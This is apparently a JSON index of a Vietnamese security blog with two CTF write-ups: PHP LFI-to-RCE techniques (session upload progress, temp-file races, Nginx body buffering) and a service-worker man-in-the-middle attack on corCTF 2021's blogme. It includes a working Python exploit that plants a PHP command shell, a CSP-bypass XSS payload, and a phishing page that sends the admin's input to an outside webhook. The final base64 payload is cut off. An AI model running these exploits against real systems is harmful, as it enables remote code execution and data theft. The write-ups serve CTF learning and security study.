[ { "title": "Các kĩ thuật nâng cao trong khai thác lỗ hổng PHP LFI2RCE", "url": "/posts/PHPLFI2RCE/", "categories": "WebSec, CTF", "tags": "rce, lfi", "date": "2022-05-22 20:10:00 +0700", "snippet": "Các kĩ thuật trong bài viết đều có thể giúp khai thác lỗi RCE nhưng cần có sự trợ giúp của LFI1. PHP Session File Upload Progress ExploitĐể thực hiện được cách khai thác này đòi hỏi một vài cấu hình của php server, vì vậy trước tiên ta cần tìm hiểu về các thiết lập mặc định trong php.ini: session.upload_progress.enabled = on Khi trình duyệt upload một file lên server thì php sẽ lưu thông tin chi tiết về file này (chẳng hạn upload time, uploadprogress, …) trong session. session.upload_progress.cleanup = on Sau khi file upload hoàn thành, session file sẽ ngay lập tức được xóa session.upload_progress.prefix = &quot;upload_progress_&quot; prefix dùng với upload progress key trong $SESSION. Key này sẽ được concatenated với giá trị của session.upload_progress.name để cho ra một index duy nhất. Giá trị mặc định của prefix là: “upload_progress” session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot; When it appears in the form, php will report the upload progress. Lợi thế lớn nhất của ta đó là giá trị của nó có thể kiểm soát được. session.auto_start=Off Nếu là On thì php sẽ tự động khởi tạo session khi nhận request và không cần phải thực thi session_start() session.use_strict_mode=0 Ta có thể kiểm soát được sessionid trong cookie và server sẽ tạo session file tương ứng với nó “sess_sessid” Session được bắt đầu trên php như thế nào?Để bắt đầu một PHP session thì ta cần hàm session_start() hoặc thay đổi giá trị của session.auto_start trong php.ini thành ON để auto session startNhưng giá trị mặc định của nó là OFF vì vậy khó có thể khai thác lỗi này.Ta có thể bypass được vấn đề này nếu ta thêm “PHP_SESSION_UPLOAD_PROGRESS” trong multipart POST data, PHP sẽ enable session cho chúng ta.Session file được lưu như thế nào ?Các file uploaded này sẽ được lưu dựa trên session.save_path và giá trị này thường sẽ được thiết lập mặc định khác nhau trong các phiên bản của phpcó thể là /tmp/sess_{sessionid} hoặc /var/lib/php/sessions/sess_{sessionid}Làm sao để bypass session_upload_progress.cleanup=ON?Như đã nói ở trên thiết lập này là mặc định và nó sẽ xóa tất cả progress information ngay khi hoàn thành quá trình đọc dữ liệu từ POST hay các file session của ta (được lưu trong save_path) sẽ ngay lập tức bị xóa.Vì thế ta cần trigger race condition để bypass vấn đề này. Dưới đây là cách để race: You can trigger the race condition by creating custom python script to brute force a session file uploaded, by including session file from local file inclusion vulnerability you found in victim site until the file is catched.(Extra: If you can see our previous demo, see the last curl on uploading session, I upload /etc/hostname as a file, you can upload large file to trying to slow down the victim site and (hanging) will result a fast race condition and it will be fast than upload small file).Để đọc nội dung của file này ta dùng vòng lặp:Ta thấy rằng giá trị của PHP_SESSION_UPLOAD_PROGRESS là Abusing PHP_SESION_UPLOAD_PROGRESS được lưu vào file session vậy nếu ta chèn một đoạn mã php và include nó thông qua LFI thì điều gì sẽ xảy ra ? 😊 =&amp;gt; RCEMột điều cần lưu ý nữa ở kĩ thuật này đó là file session sẽ chứa những content rác nên đôi khi không thích hợp cho một số trường hợp.Challenge: one-line-php (hitconctf2018)2. PHP Temporary File Upload ExploitPHP engine khi nhận được một packet POST sẽ tạo ra một hoặc nhiều các temporary files để lưu các uploaded file. PHP script xử lí các file upload này sẽ dùng move_uploaded_file() để di chuyển uploaded temporary file đến vị trí mong muốn nếu script cần sử dụng đến file này cho đến khi hoàn thành công việc. Và khi script này hoàn thành công việc PHP engine sẽ loại bỏ temporary files ứng với files uploaded.Hình sau là timeline của quá trình đề cập ở trên:Vì thế ta có thể upload một PHP script và tận dụng lỗi LFI để include temp file này vào từ đó =&amp;gt; RCE 😊Tin tốt ở đây là PHP script thường sẽ access đến thư mục nơi mà temporary files được tạo. Thư mục mặc định thường là /tmp trên linux hoặc C:\\Windows\\Temp trên windows.Tin xấu là tên của temp files này là random 😞, điều này gây ra sự cản trở trong việc áp dụng kĩ thuật này. Trên linux giá trị random này là 6 kí tự (A-Za-z0-9) và được thêm vào sau “/tmp/php” prefix e.g /tmp/phpUsM123.Bất lợi ở trên dẫn đến việc muốn khái thác lỗ hổng này cần thỏa các giả thuyết:Bên cạnh đó tác giả của bài nghiên cứu về kĩ thuật này còn đề cập về ý tưởng của họ:Hmmmm, chung quy lại thì mấu chốt vẫn là phải tìm được tên của temp file.Vô tình lướt qua một bài viết trên hacktricks thì họ có đề cập thêm các điều kiện để hỗ trợ khai thác cho lỗi này: LFI with PHPinfo assistance. To exploit this vulnerability you need: A LFI vulnerability, a page where phpinfo() is displayed, “file_uploads = on” and the server has to be able to write in the “/tmp” directory.Đại khái là sẽ có một trang display content của phpinfo() từ đó ta có thể leak được directory đến temp file vừa upload thông qua giá trị của biến $_FILES.Bên cạnh đó còn một khái niệm liên quan là PHP output buffering: PHP uses a buffer of 4096B and when it is full, it is send to the client. Then the client can send a lot of big requests (using big headers) uploading a php reverse shell, wait for the first part of the phpinfo() to be returned (where the name of the temporary file is) and try to access the temp file before the php server deletes the file exploiting a LFI vulnerability.Có thể hiểu PHP output buffering như sauChallenge: easy php (n1ctf2018)3. PHP LFI with Nginx AssistanceSection này nói về kĩ thuật khai thác cũng dựa trên LFI nhưng đặc biệt hơn ở chỗ PHP được kết hợp với Nginx server dưới một vài cấu hình đặc trưng.Các kĩ thuật đã nói ở trên dều dựa vào việc thực hiện LFI đối với session file hoặc temp file để RCE. Hãy xem một ví dụ cho trường hợp các tricks ở trên không thể dùng được:Source code:&amp;lt;?php include_once($_GET[&#39;file&#39;]);FPM / PHP config:php_admin_value[session.upload_progress.enabled] = 0php_admin_value[file_uploads] = 0Và setup permission để không thể include file từ 2 folder nàychown -R 0:0 /tmp /var/tmp /var/lib/php/sessionschmod -R 000 /tmp /var/tmp /var/lib/php/sessionsMay mắn thay, PHP hiện nay thường được deployed thông qua PHP-FPM và Nginx. Nginx cung cấp một cơ chế để quản lí requests body size gọi là client body buffering. Nếu client body lớn hơn một giá trị đã cấu hình trước thì sẽ bắt đầu tạo ra temporary files và ghi vào đó. Và tính năng này vô tình làm cho LFI2RCE trở nên khả thi 😬.Temp file này sẽ được xóa ngay sau khi được xử lí bởi Nginx. Nhưng ta có thể lợi dụng procfs để tham chiếu nó thông qua race condition:/proc/34/fd:total 0lrwx------ 1 www-data www-data 64 Dec 25 23:56 0 -&amp;gt; /dev/pts/0lrwx------ 1 www-data www-data 64 Dec 25 23:56 1 -&amp;gt; /dev/pts/0lrwx------ 1 www-data www-data 64 Dec 25 23:49 10 -&amp;gt; anon_inode:[eventfd]lrwx------ 1 www-data www-data 64 Dec 25 23:49 11 -&amp;gt; socket:[27587]lrwx------ 1 www-data www-data 64 Dec 25 23:49 12 -&amp;gt; socket:[27589]lrwx------ 1 www-data www-data 64 Dec 25 23:56 13 -&amp;gt; socket:[44926]lrwx------ 1 www-data www-data 64 Dec 25 23:57 14 -&amp;gt; socket:[44927]lrwx------ 1 www-data www-data 64 Dec 25 23:58 15 -&amp;gt; /var/lib/nginx/body/0000001368 (deleted) One cannot directly include /proc/34/fd/15 in this example as PHP’s include function would resolve the path to /var/lib/nginx/body/0000001368 (deleted) which doesn’t exist in in the filesystem. This minor restriction can luckily be bypassed by some indirection like: /proc/self/fd/34/../../../34/fd/15 which will finally execute the content of the deleted /var/lib/nginx/body/0000001368 file.Challenge: a simple challenge for approachÀ một lưu ý nữa đó là cách này chỉ dùng được khi Nginx chạy với cùng user của PHP (thường là www-data).Lí do thì mình có mail hỏi tác giả và họ rep như sau:script exploit:#!/usr/bin/env python3import sys, threading, requests# exploit PHP local file inclusion (LFI) via nginx&#39;s client body buffering assistance# see https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ for detailsURL = f&#39;http://{sys.argv[1]}:{sys.argv[2]}/&#39;# find nginx worker processes r = requests.get(URL, params={ &#39;file&#39;: &#39;/proc/cpuinfo&#39;})cpus = r.text.count(&#39;processor&#39;)r = requests.get(URL, params={ &#39;file&#39;: &#39;/proc/sys/kernel/pid_max&#39;})pid_max = int(r.text)print(f&#39;[*] cpus: {cpus}; pid_max: {pid_max}&#39;)nginx_workers = []for pid in range(pid_max): r = requests.get(URL, params={ &#39;file&#39;: f&#39;/proc/{pid}/cmdline&#39; }) if b&#39;nginx: worker process&#39; in r.content: print(f&#39;[*] nginx worker found: {pid}&#39;) nginx_workers.append(pid) if len(nginx_workers) &amp;gt;= cpus: breakdone = False# upload a big client body to force nginx to create a /var/lib/nginx/body/$Xdef uploader(): print(&#39;[+] starting uploader&#39;) while not done: requests.get(URL, data=&#39;&amp;lt;?php system($_GET[&quot;c&quot;]); /*&#39; + 16*1024*&#39;A&#39;)for _ in range(16): t = threading.Thread(target=uploader) t.start()# brute force nginx&#39;s fds to include body files via procfs# use ../../ to bypass include&#39;s readlink / stat problems with resolving fds to `/var/lib/nginx/body/0000001150 (deleted)`def bruter(pid): global done while not done: print(f&#39;[+] brute loop restarted: {pid}&#39;) for fd in range(4, 32): f = f&#39;/proc/self/fd/{pid}/../../../{pid}/fd/{fd}&#39; r = requests.get(URL, params={ &#39;file&#39;: f, &#39;c&#39;: f&#39;id&#39; }) if r.text: print(f&#39;[!] {f}: {r.text}&#39;) done = True exit()for pid in nginx_workers: a = threading.Thread(target=bruter, args=(pid, )) a.start()Tài liệu tham khảoLFI_With_PHPInfo_AssistanceWhat is PHP Output Buffering?PHP_LFI_rfc1867_temporary_filesFile Inclusion/Path traversal - HackTricksPHP LFI with Nginx Assistance" }, { "title": "Service worker và Man-in-the-Middle Attack", "url": "/posts/SWandMITM/", "categories": "WebSec, CTF", "tags": "xss, service worker", "date": "2022-05-10 23:43:00 +0700", "snippet": "Service worker và Man-in-the-Middle Attack, để hiểu rõ được về chúng thì mình sẽ chia ra từng chủ để nhỏ và cuối cùng sẽ một challenge CTF từ năm 2021 để minh họa.Service worker (SW) là gì ?Hoàn cảnh ra đờiCác trình duyệt web sử dụng Javascript như một ngôn ngữ để xử lí các đoạn code bên phía user, nếu html là khung sườn của trang web, css giúp tô điểm cho trang web thì JS góp phần làm cho trang web trở nên sinh động hơn, tương tác hơn với user. Javascript là một “single threaded language”, có nghĩa là nó thực thi các đoạn code theo thứ tự và chỉ khi xong đoạn code phía trước thì mới đến cái tiếp theo.Mỗi tab trong một trình duyệt web sẽ tương ứng với một JS thread. Và bởi vì nó là single thread nên nếu các tác vụ phải xử lí quá nhiều trên một thread như vậy sẽ dẫn đến thread này bị blocked và tất nhiên sẽ làm ảnh hướng đến perfomance của trang web đó. Service workers (SW) ra đời đã giải quyết được vấn đề nàyService workerSW chỉ đơn giản là một tệp JS. Một điểm để phân biệt giữa SW và một file JS thông thường đó là SW thì chạy trong nền và điều này cũng góp phần làm giảm đi các tác vụ phải xử lí cho JS thread đã nói ở trên. SW cung cấp các tính năng không yêu cầu giao diện hoặc tương tác với người dùng chẳng hạn như đồng bộ ngầm và push notifications …SW đóng vai trò như một proxy giữa web application và network, vì thế mà nó có thể intercept requests và xử lí chúng.service workerVòng đời của service workerSW life cycleVòng đời của một service worker bao gồm 3 giai đoạn chính: Registration Installtion ActivationTrước khi bắt đầu sử dụng một service worker ta phải đăng kí cho nó như một background process. Đoạn code minh họa cho việc đăng kí một SW:if (&#39;serviceWorker&#39; in navigator) { navigator.serviceWorker.register(&#39;/sw.js&#39;, { scope: &#39;/blog/&#39; }) .then(function (registration) { console.log(&#39;Service worker registered!&#39;); }) .catch(function (err) { console.log(&#39;Registration failed!&#39;); })}Bởi vì không hẳn là trình duyệt nào cũng hỗ trợ SW nên ta sẽ phải kiểm tra trong if.Bên cạnh đó ta cũng có thể chỉ định scope cho nó. Scope là một khái niệm quan trọng trong SW, nó chỉ định path mà SW này sẽ hoạt động. Trong ví dụ trên scope được set là /blog/ có nghĩa ta đã giới hạn vùng hoạt động của SW chỉ trong trong phạm vi của thư mục /blog/.Một vài điều cần lưu ý về giai đoạn này như sau: SW muốn được load thì phải thỏa mãn tính chất same origin. Nếu không cấu hình scope thì giá trị mặc định của nó là đường dẫn của file JS trong register().Sau khi hoàn thành đăng kí, server sẽ tải worker này vào background. Và ngay sau khi nó được tải xuống, SW nhận sự kiệnactivate , thường các lập trình viên sẽ dùng nó để khởi tạo các file tĩnh vào trong cache. Kế đó, SW tiến vào trang thái idle và quyết định trạng thái kế tiếp sẽ là gì. Hoặc là sẽ terminated đễ tiết kiệm bộ nhớ hoặc là sẽ xử lí các requests bằng sự kiện fetch/message. Tất cả các requests thuộc phạm vi đã cấu hình trong scope sẽ được xử lí.Code minh họa cho việc cấu hình sự kiện fetch trong sw.js như sau:self.addEventListener(&#39;fetch&#39;, function (event) { event.respondWith(caches.match(event.request)) .then(function (response) { return response || fetch(event.request); });});Nếu một SW được đăng kí thì trang web vẫn sẽ ưu tiên xử dụng cái cũ và đưa cái mới vào waiting sate. Một khi trang web đóng hoặc được reload thì SW mới được nạp vào sử dụng.Điểm này nên được chú ý khi muốn thực hiện một cuộc tấn công Man-in-the-Middle Attack.Man-in-the-Middle Attack (MITM) là gì ?Hồi xưa khi đi học chắc hẳn ai cũng đã từng nhận và đưa thư giùm cho mấy đứa trong lớp đúng không. Hồi đó mình còn chỉnh sửa lại thư của chúng nó cơ 😜. Kiểu tấn công này cũng tương tự dựa trên cái ví dụ mà mình đưa ra đó. Nói một cách “security” hơn về khái niệm của nó thì MITM là một kiểu tấn công bí mật xảy ra khi attacker nhảy vào một phiên giao tiếp giữa user hoặc hệ thống. Attacker sẽ mạo danh cả hai bên và có được quyền truy cập vào thông tin mà hai bên đang cố gắng gửi cho nhau. Attacker có thể chặn, gửi và nhận dữ liệu dành cho cả hai bên, mà không có bên nào biết cho đến khi quá muộn.Mối liên hệ giữa SW và MITMTới đây có thể bạn sẽ thắc mắc “thế thì MITM liên quan cái quái gì đến service worker 🤨 ???”Mình sẽ đưa ra một ví đụ dơn giản: Giả sử một trang web bán hàng bị lỗi stored XSS ở phần comment và có chức năng upload file. User muốn đọc tin tức về sản phẩm hay muốn xem profile cá nhân thì cần truy cập tới http://shopping.com/products, http://shopping.com/profile. Tính năng upload sẽ lưu file của user tại đường dẫn http://shopping.com/uploads/&amp;lt;filename&amp;gt;. Stored XSS xảy ra ở phần comment của các sản phẩm.Kịch bản tấn công sẽ như sau: Attacker sẽ upload 1 file SW - sw.js. Ở phần comment của sản phẩm dùng JS để đăng kí SW register(http://shopping.com/uploads/sw.js). Trong file sw.js này cấu hình scope: &#39;/&#39; và sự kiện fetch trả về reponse YOU ARE HACKED.Một khi user ấn vào để xem comment của sản phẩm thì vô tình trigger đống JS code -&amp;gt; register SW -&amp;gt; pwned. Lúc này khi user muốn xem profile hay thông tin sản phẩm thì thứ hiển thị chỉ là dòng chữ YOU ARE HACKED của attacker 😈.Ở đây mình chỉ đưa ra ví dụ về “Response modification” các bạn có thêm xem thêm tại đây.Qua ví dụ đơn giản này ta có thể thấy việc attacker lợi dụng service woker, hoạt động như một proxy, và kết hợp với MITM để thực hiện một cuộc tấn công phía người dùng.blogme - corCTF2021Challenge này là một cách để thực tế hóa đống lí thuyết nãy giờ. Mình cũng sẽ tiến hành phân tích hướng giải quyết cho nó dựa trên tinh thần học hỏi từ tác giả là chính.Source codehttps://github.com/strellic/my-ctf-challenges/tree/main/corCTF-2021OverviewoverviewTrang web hiển thị một vài post của admin và có các chức năng như Profile, Your Posts, Logout, Comment. Profile: tạo post, upload image file và có thể dùng để set avatar.profile Your Posts: hiển thị các post đã tạo.your posts Comment: bình luận về một post bằng cách gửi data tới ../api/comment/&amp;lt;post id&amp;gt;.commentPhân tíchHTML bị escaped ở tất cả các chỗ ngoại trừ post page. Nhưng tác giả có dùng CSP:object-src &#39;none&#39;;script-src &#39;self&#39; &#39;unsafe-eval&#39;;Và ở post thứ 3 của admin cũng có để gợi ý:“wow, a lot of people have signed up and posted stuff! my bandwith was starting to get a little high, but Cloudflare (wink) (NOT SPONSORED) saved the day :D”Để bypass thì ta có thể thử tra “cloudflare csp bypass unsafe-eval”, tìm được một payload trên tweet. Theo đó, mình nhận ra để áp dụng cách này thì trang web phải nằm trên một cloudfare domain, vì mình không có điều kiện mua domain 😅 nên chắc chỉ dừng lại ở mức phân tích thôi.post length bị giới hạn chỉ được max là 300 kí tự nên tác giả đã reconstruct lại payload:&amp;lt;form id=_cf_translation&amp;gt;&amp;lt;img id=lang-selector name=blobs&amp;gt;&amp;lt;output id=locale&amp;gt;&amp;lt;script&amp;gt;eval(name)&amp;lt;/script&amp;gt;&amp;lt;/output&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;a data-translate=value&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;script src=/cdn-cgi/scripts/zepto.min.js&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script src=/cdn-cgi/scripts/cf.common.js&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script src=/cdn-cgi/scripts/cf.common.js&amp;gt;&amp;lt;/script&amp;gt;Nhờ vào eval(name) ta có thể execute JS code chèn vào từ window.name.Đoạn code xử lí file upload thực hiện filter và chỉ nhận image trên server:filter upload fileỞ đây ta nhận thấy nếu user là admin thì sẽ không cần phải check type của file upload nên mục đích là kết hợp với csrf để upload file.Admin bot có nhiệm vụ navigate tới /api/comment sau khi view post của ta, gõ flag vào ô comment và ấn submit.Sau khi thử tạo một post với nội dung là corCTF{test_flag} để tự test thì mình nhận ra nội dung đã bị thay đổi, đoạn code đó nằm ở:replace flag commentVầy là ta phải nghĩ ra một cách để lấy được nội dung của comment mà không bị server thay đổi giá trị.Hướng đi của tác giả như sau: force admin bot upload một sw.js file, file này ta có thể access tới bằng đường dẫn /api/file?id=&amp;lt;file-id&amp;gt;. Comment page ở đường dẫn /api/comment cùng với file upload đều thuộc cùng thư mục /api nên service woker có thể hoạt động trên comment page.Tác giả tạo một sự kiện fetch trong sw.js để ngăn không cho request đi đến server mà tự trả về response nhờ vào SW. Response trả về không phải là /api/comment ban đầu nữa, mà thay vào đó là một page theo kiểu Phishing, khi admin bot gõ comment và ấn submit thì nội dung của comment sẽ được gửi đến webhook của ta.Các bước chuẩn bị: Một post với content: &amp;lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=https://exploitpage&quot; /&amp;gt; Một post dùng để bypass CSP (tạm gọi id của post này là EVAL_POSTID) với content:&amp;lt;form id=_cf_translation&amp;gt;&amp;lt;img id=lang-selector name=blobs&amp;gt;&amp;lt;output id=locale&amp;gt;&amp;lt;script&amp;gt;eval(name)&amp;lt;/script&amp;gt;&amp;lt;/output&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;a data-translate=value&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;script src=/cdn-cgi/scripts/zepto.min.js&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script src=/cdn-cgi/scripts/cf.common.js&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script src=/cdn-cgi/scripts/cf.common.js&amp;gt;&amp;lt;/script&amp;gt;Khai thác: Stage 1: gửi admin một url trỏ tới post chứa meta tag -&amp;gt; redirect đến exploit page, tại đây set window.name bằng payload dùng để upload sw.js, sau đó redirect về lại https://blogme.be.ax/post/${EVAL_POSTID} -&amp;gt; lúc này payload sẽ được executed và gửi id của file sw.js (SW_FILEID) đã được upload đến webhook. Stage 2: register sw.js đã upload register(&#39;https://blogme.be.ax/api/file?id=${SW_FILEID}&#39;)Khai thácExploit code:&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html&amp;gt;&amp;lt;body&amp;gt; &amp;lt;!-- make two pages, one with the meta tag, and the other with the form tag csp bypass set eval post id to the id of the meta tag at window.name at the bottom, run stage1 first. send the post that has the meta redirect to the admin this sends the file id of the service worker to a webhook, which you can then set as service worker file id. then, change it to run stage2 your webhook should have the flag! --&amp;gt; &amp;lt;!-- &amp;lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=https://THISHTMLFILE&quot; /&amp;gt; --&amp;gt; &amp;lt;!--&amp;lt;form id=_cf_translation&amp;gt;&amp;lt;img id=lang-selector name=blobs&amp;gt;&amp;lt;output id=locale&amp;gt;&amp;lt;script&amp;gt;eval(name)&amp;lt;/script&amp;gt;&amp;lt;/output&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;a data-translate=value&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;script src=/cdn-cgi/scripts/zepto.min.js&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script src=/cdn-cgi/scripts/cf.common.js&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script src=/cdn-cgi/scripts/cf.common.js&amp;gt;&amp;lt;/script&amp;gt;--&amp;gt; &amp;lt;script&amp;gt; const EVAL_POSTID = &quot;8d44702a-dc4b-43f4-8651-0a64bc88fb08&quot;; const SW_FILEID = &quot;a944179f-b7eb-4297-a3e3-9548feff8918&quot;; /*self.addEventListener(&#39;fetch&#39;, async (e) =&amp;gt; { console.log(e); if(e.request.url.includes(&quot;/api/comment&quot;)) { e.respondWith(new Response(new Blob([`&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html lang=&quot;en&quot;&amp;gt;&amp;lt;head&amp;gt; &amp;lt;meta charset=&quot;utf-8&quot;&amp;gt; &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, shrink-to-fit=no&quot;&amp;gt; &amp;lt;title&amp;gt;blogme&amp;lt;/title&amp;gt; &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;/assets/bootstrap/css/bootstrap.min.css&quot;&amp;gt; &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;https://fonts.googleapis.com/css2?family=Lato:wght@400;700&amp;amp;amp;display=swap&quot;&amp;gt; &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;https://fonts.googleapis.com/css?family=Lora&quot;&amp;gt; &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;/assets/css/styles.css&quot;&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt; &amp;lt;nav class=&quot;navbar navbar-dark navbar-expand-md textwhite bg-primary text-white navigation-clean&quot;&amp;gt; &amp;lt;div class=&quot;container&quot;&amp;gt; &amp;lt;a class=&quot;navbar-brand&quot; href=&quot;/&quot;&amp;gt;blogme&amp;lt;/a&amp;gt; &amp;lt;button data-bs-toggle=&quot;collapse&quot; class=&quot;navbar-toggler&quot; data-bs-target=&quot;#navcol&quot;&amp;gt; &amp;lt;span class=&quot;visually-hidden&quot;&amp;gt;Toggle navigation&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;navbar-toggler-icon&quot;&amp;gt;&amp;lt;/span&amp;gt; &amp;lt;/button&amp;gt; &amp;lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navcol&quot;&amp;gt; &amp;lt;ul class=&quot;navbar-nav ms-auto&quot;&amp;gt; &amp;lt;li class=&quot;nav-item&quot;&amp;gt;&amp;lt;a class=&quot;nav-link&quot; href=&quot;/&quot;&amp;gt;Home&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt; &amp;lt;li class=&quot;nav-item&quot;&amp;gt;&amp;lt;a class=&quot;nav-link&quot; href=&quot;/profile&quot;&amp;gt;Profile&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt; &amp;lt;li class=&quot;nav-item&quot;&amp;gt;&amp;lt;a class=&quot;nav-link&quot; href=&quot;/posts&quot;&amp;gt;Your Posts&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt; &amp;lt;li class=&quot;nav-item&quot;&amp;gt;&amp;lt;a class=&quot;nav-link&quot; href=&quot;/api/logout&quot;&amp;gt;Logout&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt; &amp;lt;/ul&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/nav&amp;gt; &amp;lt;div class=&quot;container card bg-secondary mt-5 p-0&quot;&amp;gt; &amp;lt;div class=&quot;card-header&quot;&amp;gt;&amp;lt;h3 class=&quot;m-0&quot;&amp;gt;Comment&amp;lt;/h3&amp;gt;&amp;lt;/div&amp;gt; &amp;lt;div class=&quot;card-body&quot;&amp;gt; &amp;lt;div class=&quot;card-text&quot;&amp;gt;Enter your comment below:&amp;lt;/div&amp;gt; &amp;lt;form method=&quot;POST&quot; action=&quot;https://enx4khh4m6jy.x.pipedream.net/&quot;&amp;gt; &amp;lt;input class=&quot;form-control&quot; type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;7213f554-2b98-422a-8416-7a45d6c716be&quot;&amp;gt; &amp;lt;div class=&quot;input-group mt-3&quot;&amp;gt; &amp;lt;span class=&quot;input-group-text&quot;&amp;gt;Comment&amp;lt;/span&amp;gt; &amp;lt;textarea class=&quot;form-control&quot; name=&quot;text&quot; rows=3 maxlength=150&amp;gt;&amp;lt;/textarea&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;input type=&quot;hidden&quot; name=&quot;_csrf&quot; value=&quot;QaJVpRex-Yx3UhVRDCHWKT8GgJwg8P9HkRAM&quot;&amp;gt; &amp;lt;button class=&quot;btn btn-primary mt-3 float-end&quot; type=&quot;submit&quot;&amp;gt;Comment&amp;lt;/button&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;script src=&quot;/assets/bootstrap/js/bootstrap.min.js&quot;&amp;gt;&amp;lt;/scr` + `ipt&amp;gt; &amp;lt;script src=&quot;/assets/js/jquery.min.js&quot;&amp;gt;&amp;lt;/scr` + `ipt&amp;gt; &amp;lt;script src=&quot;/assets/js/script.js&quot;&amp;gt;&amp;lt;/scr` + `ipt&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt; `], { type: &#39;text/html&#39; }))); } return;}); */ let stage1 = () =&amp;gt; { fetch(&quot;data:application/javascript;base64,c2VsZi5hZGRFdmVudExpc3RlbmVyKCdmZXRjaCcsIGFzeW5jIChlKSA9PiB7CiAgICBjb25zb2xlLmxvZyhlKTsKICAgIGlmKGUucmVxdWVzdC51cmwuaW5jbHVkZXMoIi9hcGkvY29tbWVudCIpKSB7CiAgICAgICAgZS5yZXNwb25kV2l0aChuZXcgUmVzcG9uc2UobmV3IEJsb2IoW2AKCjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+Cgo8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wLCBzaHJpbmstdG8tZml0PW5vIj4KICAgIDx0aXRsZT5ibG9nbWU8L3RpdGxlPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIvYXNzZXRzL2Jvb3RzdHJhcC9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2NzczI/ZmFtaWx5PUxhdG86d2dodEA0MDA7NzAwJmFtcDtkaXNwbGF5PXN3YXAiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9TG9yYSI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii9hc3NldHMvY3NzL3N0eWxlcy5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxuYXYgY2xhc3M9Im5hdmJhciBuYXZiYXItZGFyayBuYXZiYXItZXhwYW5kLW1kIHRleHR3aGl0ZSBiZy1wcmltYXJ5IHRleHQtd2hpdGUgbmF2aWdhdGlvbi1jbGVhbiI+CiAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICAgICAgPGEgY2xhc3M9Im5hdmJhci1icmFuZCIgaHJlZj0iLyI+YmxvZ21lPC9hPgogICAgICAgICAgICA8YnV0dG9uIGRhdGEtYnMtdG9nZ2xlPSJjb2xsYXBzZSIgY2xhc3M9Im5hdmJhci10b2dnbGVyIiBkYXRhLWJzLXRhcmdldD0iI25hdmNvbCI+CiAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0idmlzdWFsbHktaGlkZGVuIj5Ub2dnbGUgbmF2aWdhdGlvbjwvc3Bhbj4KICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJuYXZiYXItdG9nZ2xlci1pY29uIj48L3NwYW4+CiAgICAgICAgICAgIDwvYnV0dG9uPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2xsYXBzZSBuYXZiYXItY29sbGFwc2UiIGlkPSJuYXZjb2wiPgogICAgICAgICAgICAgICAgPHVsIGNsYXNzPSJuYXZiYXItbmF2IG1zLWF1dG8iPgogICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPjxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iLyI+SG9tZTwvYT48L2xpPgogICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPjxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iL3Byb2ZpbGUiPlByb2ZpbGU8L2E+PC9saT4KICAgICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIj48YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Ii9wb3N0cyI+WW91ciBQb3N0czwvYT48L2xpPgogICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPjxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iL2FwaS9sb2dvdXQiPkxvZ291dDwvYT48L2xpPgogICAgICAgICAgICAgIC